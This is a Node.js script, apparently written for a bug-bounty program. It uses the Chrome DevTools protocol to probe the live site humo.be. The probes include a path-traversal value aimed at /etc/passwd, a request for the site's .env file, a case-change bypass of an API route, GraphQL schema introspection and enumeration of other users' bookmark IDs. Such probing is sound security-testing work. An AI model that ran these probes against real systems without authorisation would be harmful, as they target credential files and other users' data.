// humo_sweep4.js — final remaining tests with proper pacing.
const http = require('http');
const fs = require('fs');
const path = require('path');
const DIR = path.join(__dirname, '..', 'findings', 'bounties', 'humo-h1');

function getJSON(p) {
  return new Promise((r, j) => {
    http.get({ host: '127.0.0.1', port: 9223, path: p }, c => {
      let d = '';
      c.on('data', x => d += x);
      c.on('end', () => r(JSON.parse(d)));
    }).on('error', j);
  });
}

function cdp(ws, m, p = {}) {
  return new Promise((r, j) => {
    const id = Math.floor(Math.random() * 1e9);
    const t = setTimeout(() => j(new Error('timeout')), 12000);
    const h = evt => {
      const msg = JSON.parse(evt.data);
      if (msg.id === id) { clearTimeout(t); ws.removeEventListener('message', h); msg.error ? j(new Error(JSON.stringify(msg.error))) : r(msg.result); }
    };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id, method: m, params: p }));
  });
}

async function main() {
  const targets = await getJSON('/json');
  let tab = targets.find(t => t.type === 'page');
  const ws = new WebSocket(tab.webSocketDebuggerUrl);
  await new Promise(r => ws.onopen = r);

  await cdp(ws, 'Page.enable');
  await cdp(ws, 'Runtime.enable');

  const evalAsync = async (expr) => {
    const r = await cdp(ws, 'Runtime.evaluate', {
      expression: '(async () => { ' + expr + ' })()',
      awaitPromise: true, returnByValue: true
    });
    return r.result.value;
  };

  var results = {};
  await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
  await new Promise(r => setTimeout(r, 6000));

  // 1. Error pages (paced, one at a time)
  console.log('=== Error pages ===');
  var e1 = await evalAsync('var r=await fetch("https://www.humo.be/nonexistent-xyz-12345");return r.status+" | "+(await r.text()).slice(0,200).replace(/\\n/g," ");');
  console.log('  404: ' + e1); results.err404 = e1;
  await new Promise(r => setTimeout(r, 2000));

  var e2 = await evalAsync('var r=await fetch("https://www.humo.be/api/_next-api/bookmarks?userId=../../etc/passwd");return r.status+" | "+(await r.text()).slice(0,200).replace(/\\n/g," ");');
  console.log('  path traversal: ' + e2); results.errPath = e2;
  await new Promise(r => setTimeout(r, 2000));

  // 2. .env via browser
  console.log('\n=== .env ===');
  var env = await evalAsync('var r=await fetch("https://www.humo.be/.env");return r.status+" | "+(await r.text()).slice(0,400).replace(/\\n/g," ");');
  console.log('  ' + env); results.env = env;
  await new Promise(r => setTimeout(r, 2000));

  // 3. Case bypass deep
  console.log('\n=== Case bypass ===');
  var c1 = await evalAsync('var r=await fetch("https://www.humo.be/API/_NEXT-API/BOOKMARKS?userId=1");return r.status+" | "+(await r.text()).slice(0,100);');
  console.log('  /API/...: ' + c1); results.case1 = c1;
  await new Promise(r => setTimeout(r, 2000));

  // 4. __NEXT_DATA__
  console.log('\n=== __NEXT_DATA__ ===');
  var nd = await evalAsync('var el=document.getElementById("__NEXT_DATA__");if(el)return el.textContent.slice(0,1500);return "not found";');
  console.log('  ' + nd.slice(0, 300)); results.nextData = nd.slice(0, 300);
  await new Promise(r => setTimeout(r, 2000));

  // 5. GraphQL
  console.log('\n=== GraphQL ===');
  var gql = await evalAsync('var r=await fetch("https://www.humo.be/graphql",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({query:"{__schema{types{name}}}"})});return r.status+" | "+(await r.text()).slice(0,200);');
  console.log('  ' + gql); results.gql = gql;
  await new Promise(r => setTimeout(r, 2000));

  // 6. Rate limit test (slower pace)
  console.log('\n=== Rate limit (paced) ===');
  var rl = [];
  for (var k = 0; k < 3; k++) {
    var rr = await evalAsync('var r=await fetch("https://www.humo.be/api/_next-api/bookmarks?userId='+(k+1)+'");return r.status;');
    rl.push(rr);
    await new Promise(r => setTimeout(r, 3000));
  }
  console.log('  ' + rl.join(', ')); results.rl = rl.join(',');

  fs.writeFileSync(path.join(DIR, 'deep_sweep4_results.json'), JSON.stringify(results, null, 2));
  console.log('\n=== Saved ===');
  ws.close();
}

main().catch(function(e) { console.error(e); process.exit(1); });
